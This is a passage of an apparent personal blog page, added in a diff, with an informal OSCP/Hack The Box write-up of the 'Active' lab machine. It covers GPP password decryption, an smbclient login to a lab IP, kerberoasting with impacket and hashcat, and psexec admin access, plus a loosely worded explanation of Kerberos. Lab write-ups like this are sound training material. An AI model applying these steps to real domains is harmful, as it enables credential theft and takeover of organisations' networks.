+6bcb9cff...</code></pre><p>I found ret to lib c attack hard in this but i learnt how the offset works and how lib c address changes and thats why it is now easy</p><h2 id="hardest-windows-ctf">Hardest Windows CTF</h2><p>hardest windows machine i did for oscp was kerberoasting</p><p>i found this file in the smb enumeration phase  catting it was this</p><p>\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2019_11_4-1024x121.png" class="kg-image" alt loading="lazy" width="770" height="91"></figure><p>then decrypted gpp password and got user by</p><p><code>smbclient //10.10.10.100/Users -U SVC_TGS</code><br> then i used impackets getuserspn.py with our user to get administrator’s ticket then cracked it with hashcat and then used impackets psexec.py to get  admin access</p><p>i solved this by understanding about kerberoasting which is:<br>Kerberos is one of the most used protocol for maintaining authentication &amp; authorization in an environment. Everything is done through tickets &amp; can be described as follows:-</p><p>1) Authentication (or Ticket Granting Ticket)<br> 2) Authorization (or Ticket Granting Service)</p><p>In kerberos environment, if we want to access (let’s say FTP service running on server C) first we need a valid TGT. A domain user NTLM hash encrypted with the current user timestamp is sent to the Domain Controller.<br>If the DC verifies the resources, a valid TGT is granted to the domain user. A TGS will then be requested by the domain user &amp; based on the privileges of the user TGS would then br granted.</p><p>Once the domain user have the TGS (of the service “FTP” running on server C), bruteforcing can then be performed &amp; this procedure can then be called as kerberoasting.</p><p>please refer to this writeup don’t want to make this too long  for more info also check out my git repo for files and things i used for this machine</p><p>https://0xrick.github.io/hack-the-box/active/</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/ctf/" class="tag">CTF</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
